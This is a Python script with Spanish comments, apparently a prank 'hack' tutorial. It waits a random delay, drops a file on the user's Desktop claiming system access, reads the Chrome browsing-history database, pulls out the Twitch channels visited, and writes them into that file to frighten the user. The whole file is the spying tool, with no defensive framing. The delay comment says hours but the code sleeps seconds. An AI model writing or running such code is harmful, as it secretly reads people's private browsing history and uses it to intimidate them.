from time import sleep
from random import randrange
from pathlib import Path
import sqlite3
import os
import re


ARCHIVO_HACK_NOMBRE = "PARA TI.txt"


def tomar_ruta_usuario():
    return "{}/".format(Path.home())


def retrasar_ejecucion():
    numero_horas = randrange(1, 4)  
    print("Durmiendo {} horas".format(numero_horas))
    sleep(numero_horas)


def crear_archivo_hack(ruta_usuario):
    hacker_file = open(ruta_usuario + "Desktop/" + ARCHIVO_HACK_NOMBRE, "w")     # Asignamos la ruta y operación a una variable para hacer referencia a ella más tarde.
    hacker_file.write("Hola, ¡enhorabuena! tienes el honor de que haya accedido a tu sistema...    :) \n\n\n Veamos... \n\n")     # Escribimos en el fichero creado lo que queramos.

    return hacker_file


def tomar_historial_chrome(ruta_usuario):

    urls = None
    
    while not urls:
        try:
            ruta_historial = ruta_usuario + "/AppData/Local/Google/Chrome/User Data/Default/History"     
            # El archivo History de Chrome, es un archivo de SQLITE por lo que no podrémos leer el archivo sin la libreria SQLITE de python

            connection = sqlite3.connect(ruta_historial)
            cursor = connection.cursor()    # Nos permite "hablar" con la base de datos
            cursor.execute("SELECT title, last_visit_time, url FROM urls ORDER BY last_visit_time DESC") # Establecemos la consulta a realizar a la BBDD
            urls = cursor.fetchall()
            connection.close()      # Cerramos la conexión
            return urls

        except sqlite3.OperationalError:
            print("reintentando")
            sleep(5)    # Si chrome está abierto al no poder acceder a la BBDD esperaremos 5 segundos para intentarlo de nuevo


def historial_y_añadir_mensajes(hacker_file, historial_chrome):
    # Creamos un for que recorra el historial y capturamos con una expresion regular los perfiles de twitch que hemos visitado

    perfiles_visitados_twitch = []
    for item in historial_chrome:
        resultados_twitch = re.findall("https://www.twitch.tv/([A-Za-z0-9]+)$", item[2])

        if resultados_twitch:
            perfiles_visitados_twitch.append(resultados_twitch[0])

    hacker_file.write("He visto que has estado husmeando los canales de Twitch de {}...".format(", ".join(perfiles_visitados_twitch)))


def main():

    retrasar_ejecucion()
    # Retrasamos la ejecución del script entre 1 y 3 horas desde que se ejecuta.
    ruta_usuario = tomar_ruta_usuario()
    print(ruta_usuario)
    # Calculamos la ruta del usuario de windows
    hacker_file = crear_archivo_hack(ruta_usuario)
    # Creamos un archivo en el escritorio
    historial_chrome = tomar_historial_chrome(ruta_usuario)
    # Recogemos su historial de chrome cuando sea posible...
    historial_y_añadir_mensajes(hacker_file, historial_chrome)
    # Comprobamos el historial y 'asustamos' al ususario.
    

if __name__ == "__main__":
    main()
